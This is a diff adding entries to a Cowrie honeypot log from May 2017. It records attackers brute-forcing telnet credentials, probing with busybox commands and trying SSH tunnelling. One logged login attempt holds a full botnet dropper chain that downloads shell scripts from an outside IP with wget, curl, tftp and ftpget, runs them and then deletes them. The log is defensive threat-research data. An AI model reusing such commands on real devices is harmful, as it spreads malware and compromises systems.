@@ -3330,3 +3330,42 @@
 2017-05-08T17:52:59+0000 [CowrieTelnetTransport,50702,82.118.242.174] Warning: state changed and new state returned
 2017-05-08T17:53:01+0000 [CowrieTelnetTransport,50702,82.118.242.174] login attempt: 719
 2017-05-08T17:53:01+0000 [CowrieTelnetTransport,50702,82.118.242.174] login return, expect: [admin/meinsm]
+2017-05-08T17:53:01+0000 [CowrieTelnetTransport,50702,82.118.242.174] login attempt [sh/cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.118.242.175/bins.sh; curl -O http://82.118.242.175/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 82.118.242.175 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 82.118.242.175; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 82.118.242.175 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *] failed
+2017-05-08T17:53:01+0000 [CowrieTelnetTransport,50702,82.118.242.174] Warning: state changed and new state returned
+2017-05-08T17:53:15+0000 [CowrieTelnetTransport,50702,82.118.242.174] Connection lost after 17 seconds
+2017-05-08T17:53:19+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,74442,91.195.103.205] got channel 'direct-tcpip' request
+2017-05-08T17:53:19+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,74442,91.195.103.205] direct-tcp connection request to 104.109.107.107:443 from localhost:5556
+2017-05-08T17:53:19+0000 [SSHChannel None (78) on SSHService 'ssh-connection' on HoneyPotSSHTransport,74442,91.195.103.205] direct-tcp forward to 104.109.107.107:443 with data '\x80z\x01\x03\x01\x00Q\x00\x00\x00 \x00\x009\x00\x008\x00\x005\x00\x00\x16\x00\x00\x13\x00\x00\n\x07\x00\xc0\x00\x003\x00\x002\x00\x00/\x00\x00\x07\x05\x00\x80\x03\x00\x80\x00\x00\x05\x00\x00\x04\x01\x00\x80\x00\x00\x15\x00\x00\x12\x00\x00\t\x06\x00@\x00\x00\x14\x00\x00\x11\x00\x00\x08\x00\x00\x06\x04\x00\x80\x00\x00\x03\x02\x00\x80\xe79\xfa\x043jP\xc6\x8e\x1f\xef\x9c\xd4\xdc\xc4\xfb6\xdcP\x01\x9b$\x8aK\x8b\x1db 7[^\x03'
+2017-05-08T17:53:19+0000 [SSHChannel None (78) on SSHService 'ssh-connection' on HoneyPotSSHTransport,74442,91.195.103.205] failed to connect: Connection refused
+2017-05-08T17:53:19+0000 [SSHChannel None (78) on SSHService 'ssh-connection' on HoneyPotSSHTransport,74442,91.195.103.205] sending close 78
+2017-05-08T17:53:21+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 201.75.115.191:39123 (10.8.41.81:2223) [session: TT50703]
+2017-05-08T17:53:23+0000 [CowrieTelnetTransport,50703,201.75.115.191] first time for 201.75.115.191, need: 1
+2017-05-08T17:53:23+0000 [CowrieTelnetTransport,50703,201.75.115.191] login attempt: 1
+2017-05-08T17:53:24+0000 [CowrieTelnetTransport,50703,201.75.115.191] login attempt [supervisor/supervisor] succeeded
+2017-05-08T17:53:25+0000 [CowrieTelnetTransport,50703,201.75.115.191] Opening TTY Log: log/tty/20170508-175325-None-50703i.log
+2017-05-08T17:53:25+0000 [CowrieTelnetTransport,50703,201.75.115.191] Warning: state changed and new state returned
+2017-05-08T17:53:26+0000 [CowrieTelnetTransport,50703,201.75.115.191] CMD: enable
+2017-05-08T17:53:26+0000 [CowrieTelnetTransport,50703,201.75.115.191] Command found: enable 
+2017-05-08T17:53:26+0000 [CowrieTelnetTransport,50703,201.75.115.191] Reading txtcmd from "txtcmds/bin/enable"
+2017-05-08T17:53:26+0000 [CowrieTelnetTransport,50703,201.75.115.191] CMD: shell
+2017-05-08T17:53:26+0000 [CowrieTelnetTransport,50703,201.75.115.191] Command not found: shell
+2017-05-08T17:53:26+0000 [CowrieTelnetTransport,50703,201.75.115.191] CMD: sh
+2017-05-08T17:53:26+0000 [CowrieTelnetTransport,50703,201.75.115.191] Command found: sh 
+2017-05-08T17:53:26+0000 [CowrieTelnetTransport,50703,201.75.115.191] CMD: cat /proc/mounts; /bin/busybox ZSTAN
+2017-05-08T17:53:26+0000 [CowrieTelnetTransport,50703,201.75.115.191] Command found: cat /proc/mounts
+2017-05-08T17:53:26+0000 [CowrieTelnetTransport,50703,201.75.115.191] Command found: /bin/busybox ZSTAN
+2017-05-08T17:53:27+0000 [CowrieTelnetTransport,50703,201.75.115.191] CMD: cd /dev/shm; (cat .s || cp /bin/echo .s); /bin/busybox ZSTAN
+2017-05-08T17:53:27+0000 [CowrieTelnetTransport,50703,201.75.115.191] Command found: cd /dev/shm
+2017-05-08T17:53:27+0000 [CowrieTelnetTransport,50703,201.75.115.191] Command found: cat .s
+2017-05-08T17:53:27+0000 [CowrieTelnetTransport,50703,201.75.115.191] Command found: cp /bin/echo .s
+2017-05-08T17:53:27+0000 [CowrieTelnetTransport,50703,201.75.115.191] Command found: /bin/busybox ZSTAN
+2017-05-08T17:53:27+0000 [CowrieTelnetTransport,50703,201.75.115.191] CMD: nc; wget; /bin/busybox ZSTAN
+2017-05-08T17:53:27+0000 [CowrieTelnetTransport,50703,201.75.115.191] Command not found: nc
+2017-05-08T17:53:27+0000 [CowrieTelnetTransport,50703,201.75.115.191] Command found: wget 
+2017-05-08T17:53:27+0000 [CowrieTelnetTransport,50703,201.75.115.191] Command found: /bin/busybox ZSTAN
+2017-05-08T17:53:27+0000 [CowrieTelnetTransport,50703,201.75.115.191] CMD: (dd bs=52 count=1 if=.s || cat .s)
+2017-05-08T17:53:27+0000 [CowrieTelnetTransport,50703,201.75.115.191] Command not found: dd bs=52 count=1 if=.s
+2017-05-08T17:53:27+0000 [CowrieTelnetTransport,50703,201.75.115.191] Command found: cat /dev/shm/.s
+2017-05-08T17:53:28+0000 [CowrieTelnetTransport,50703,201.75.115.191] CMD: /bin/busybox ZSTAN
+2017-05-08T17:53:28+0000 [CowrieTelnetTransport,50703,201.75.115.191] Command found: /bin/busybox ZSTAN
+2017-05-08T17:53:53+0000 [CowrieTelnetTransport,50701,211.161.9.60] Connection lost after 66 seconds
